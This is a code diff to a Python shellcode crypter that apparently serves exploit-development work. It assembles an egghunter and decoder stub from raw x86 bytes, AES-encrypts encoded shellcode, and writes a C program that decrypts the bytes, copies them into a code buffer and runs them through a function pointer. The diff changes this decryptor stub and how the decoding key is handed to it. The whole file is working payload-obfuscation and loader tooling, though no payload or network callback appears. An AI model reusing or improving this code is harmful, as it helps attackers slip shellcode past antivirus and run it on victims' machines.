@@ -45,6 +45,8 @@ def create_decoder_shellcode(egg, encoded_bytes, delimiter):
               r',0x1f,0x8a,0x03,0x30,0x06,0x46,0x43,0xe2,0xf8,0xeb,0x05,0xe8,0xe6,0xff,0xff,0xff,'
         enc_shellcode = r','.join(encoded_bytes)
         output = start + egg + end + enc_shellcode
+
+
     else:
         start = r'\x31\xd2\x31\xc9\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8'
         end = r'\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xeb\x15\x5e\x31\xc9\xb1\x19\x31\xdb\x31\xc0\x8d\x1f\x8a\x03\x30\x06' \
@@ -59,20 +61,23 @@ def create_decryption_source(d_params):
     c_decl_decrypt = '\tAES128_CBC_decrypt_buffer(buffer+0, in+0,  16, key, iv);\n'
     for chunk in range(1, d_params['chunks']):
         c_decl_decrypt += '\tAES128_CBC_decrypt_buffer(buffer+{0}, in+{0}, 16, 0, 0);\n'.format(chunk * 16)
+    c_decl_code = 'uint8_t code[{0}] ='.format(d_params['decoder_stub_size']) + r'{ 0 };' + '\n'
+    c_decl_memcpy = '\tmemcpy(code, buffer, {0});\n'.format(d_params['decoder_stub_size'])
     c_enc_shellcode = d_params['encrypted_shellcode'] + '\n\n'
     c_main_opening = r"main()" + '\n' + '{' + '\n'
     c_main_closing = '}\n'
-    c_execute_shellcode = '\t\n' + r'printf("Shellcode Length:  %d\n", strlen(buffer));' + '\n\t' + \
-                          'int (*ret)() = (int(*)())buffer;\n\t' + \
+    c_execute_shellcode = '\t\n\t' + r'printf("Shellcode Length:  %d\n", strlen(code));' + '\n\t' + \
+                          'int (*ret)() = (int(*)())code;\n\t' + \
                           "ret();\n"
 
     source_code_list = [ d_params['header'], d_params['key'], d_params['iv'], d_params['buffer'],
-                        c_enc_shellcode, c_main_opening, c_decl_decrypt, c_execute_shellcode, c_main_closing ]
+                         d_params['decode_key'], c_decl_code, c_enc_shellcode, c_main_opening, c_decl_decrypt,
+                         c_decl_memcpy, c_execute_shellcode, c_main_closing ]
 
     with open('shellcode.c', mode='w') as fp_decrypt_source:
         fp_decrypt_source.writelines(source_code_list)
 
-def create_source_files(decoder_stub_size, encryption_key):
+def create_source_files(eggified_key, decoder_stub_size, encryption_key):
 
     if decoder_stub_size % 16 == 0:
         buffer_size = decoder_stub_size
@@ -85,6 +90,8 @@ def create_source_files(decoder_stub_size, encryption_key):
     keybytestring = ", ".join("0x{:02x}".format(ord(c)) for c in encryption_key)
     c_decl_key = 'uint8_t key[] = { ' + keybytestring + ' }; \n\n'
 
+    # the_key is for decoding after encryption
+    c_decl_1 = 'uint8_t the_key[] = { ' + ', '.join(eggified_key) + r' };' + '\n\n'
     # Define the c source code for the initialization vector variable
     iv_seq = [randint(0, 255) for c in range(16)]
     iv_string = ", ".join("0x{:02x}".format(n) for n in iv_seq)
@@ -92,6 +99,7 @@ def create_source_files(decoder_stub_size, encryption_key):
 
     # Define the c source code for the in variable (the encoded decoder stub+egghunter shellcode)
     byte_order_egg_string = (delim_char + args.egg[2:4] + ',' + delim_char + args.egg[0:2] + ',') * 2
+
     decoder_shellcode = create_decoder_shellcode(byte_order_egg_string, byte_string_dict['enc.hex'], r'0x')
     c_decl_in = 'uint8_t in[] = { ' + decoder_shellcode + ' }; \n\n'
 
@@ -125,7 +133,8 @@ def create_source_files(decoder_stub_size, encryption_key):
 
     # Do the same thing with the decryption source file
     decryption_params = { 'header': c_header, 'key': c_decl_key, 'iv': c_decl_iv, 'buffer': c_buffer_decl,
-                          'chunks': chunks, 'buffersize': buffer_size, 'encrypted_shellcode': encrypted_shellcode_var }
+                          'chunks': chunks, 'buffersize': buffer_size, 'encrypted_shellcode': encrypted_shellcode_var,
+                          'decoder_stub_size': decoder_stub_size, 'decode_key': c_decl_1 }
     create_decryption_source(decryption_params)
 
 def create_decoder_only_source():
@@ -192,6 +201,8 @@ for i in range(4):
     eggified_key.insert(0, delim_char + args.egg[0:2])
     eggified_key.insert(0, delim_char + args.egg[2:4])
 
+
+
 # If the encryption option has been selected, automatically format in ASM
 if args.encryption_key:
     args.fmt = 'asm'
@@ -200,7 +211,7 @@ if args.fmt == 'asm':
     # Add the encoded shellcode size plus the decoder stub + the egg.  Egg & decoder stub are 68 bytes in length.
     buf_size = file_byte_counts['enc.hex'] + 68
 
-    create_source_files(buf_size, args.encryption_key)
+    create_source_files(eggified_key, buf_size, args.encryption_key)
 else:
     create_decoder_only_source()
 
